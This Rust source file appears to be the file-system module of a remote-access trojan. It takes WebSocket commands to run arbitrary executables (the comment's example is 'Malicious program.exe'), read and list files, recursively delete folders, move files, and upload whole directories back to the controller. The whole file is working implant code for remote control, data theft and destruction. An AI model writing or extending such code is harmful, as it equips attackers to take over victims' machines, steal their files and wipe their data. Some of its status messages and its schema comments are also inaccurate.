use std::fs;
use std::io::Read;
use std::path::Path;

use tungstenite::Message;

use crate::handlers::func::Function;
use crate::Socket;

/*
Schema:
1 - Run file
Example:
1C:/Users/james/Malicious program.exe

2 - cat/ls
Example:

2C:/Users/james/file.txt
2C:/Users/james/folder

3 - Delete folder/file

Example:
3C:/Users/james/file.txt
3C:/Users/james/folder

4 - Move folder/file
Example:
4C:/Users/james/from/file.txt$C:/Users/james/to/file.txt


5 - Get folder/file
4C:/Users/james/folder1/file.txt
*/
pub struct FileSystem;

impl Function for FileSystem {
    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
        let operation = payload[0] as char;
        let paths = payload[1..]
            .iter()
            .map(|b| *b as char)
            .collect::<String>()
            .split('$')
            .map(|s| s.to_string())
            .collect::<Vec<String>>();

        let path = Path::new(&paths[0]);
        match operation {
            '1' => run_file(path, ctx.socket),
            '2' => get_path_content(path, ctx.socket),
            '3' => delete_path(path, ctx.socket),
            '4' => move_object(path, Path::new(&paths[1]), ctx.socket),
            '5' => download_object(path, ctx.socket),
            _ => {
                panic!("Invalid FS operation");
            }
        };

        Ok(())
    }
}

fn download_object(path: &Path, socket: &mut Socket) {
    let metadata = fs::metadata(path).unwrap();
    if metadata.is_file() {
        let file_name = path.file_name().unwrap().to_str().unwrap();

        let mut scuf_buf = vec![];
        scuf_buf.extend_from_slice(file_name.as_bytes());
        scuf_buf.push(b'\n');

        let mut file = fs::File::open(path).unwrap();
        let mut file_buffer = [0; 1024];
        loop {
            let n = file.read(&mut file_buffer).unwrap();
            if n == 0 {
                break;
            }
            scuf_buf.extend_from_slice(&file_buffer[..n]);
        }

        socket.send(Message::Binary(scuf_buf)).unwrap();
    } else if metadata.is_dir() {
        for entry in fs::read_dir(path).unwrap() {
            let entry = entry.unwrap();
            download_object(&entry.path(), socket);
        }
    }
}

fn run_file(path: &Path, socket: &mut Socket) {
    if std::process::Command::new(path).spawn().is_ok() {
        socket.send("OK runned".into()).unwrap();
        return;
    }
    socket.send("NO not runned".into()).unwrap()
}

fn get_path_content(path: &Path, socket: &mut Socket) {
    let meta = fs::metadata(path);
    if let Ok(metadata) = meta {
        if metadata.is_file() {
            let contents = fs::read_to_string(path).unwrap();
            socket.write(contents.into()).unwrap();
        } else if metadata.is_dir() {
            let contents = fs::read_dir(path).unwrap();
            let mut files = String::new();
            for obj in contents {
                let obj = obj.unwrap();
                let file_type = if obj.file_type().unwrap().is_dir() {
                    "Dir"
                } else {
                    "File"
                };
                files.push_str(&format!(
                    "{} ({})\n",
                    obj.file_name().into_string().unwrap(),
                    file_type
                ));
            }
            socket.send(files.into()).unwrap();
        }
    }
}

fn delete_path(path: &Path, socket: &mut Socket) {
    fn remove(path: &Path) {
        let meta = fs::metadata(path);
        if let Ok(metadata) = meta {
            if metadata.is_dir() {
                fs::remove_dir_all(path).unwrap();
            } else if metadata.is_file() {
                fs::remove_file(path).unwrap();
            }
        }
    }
    let metadata = fs::metadata(path).unwrap();
    if !metadata.is_symlink() {
        remove(path);
    } else if let Ok(link_path) = fs::read_link(path) {
        remove(&link_path);
    }
    socket
        .send(format!("OK deleted {}", path.to_str().unwrap()).into())
        .unwrap()
}

fn move_object(from: &Path, to: &Path, socket: &mut Socket) {
    if fs::rename(from, to).is_ok() {
        socket.send("OK deleted".into()).unwrap();
        return;
    }
    socket.send("NO not deleted".into()).unwrap();
}
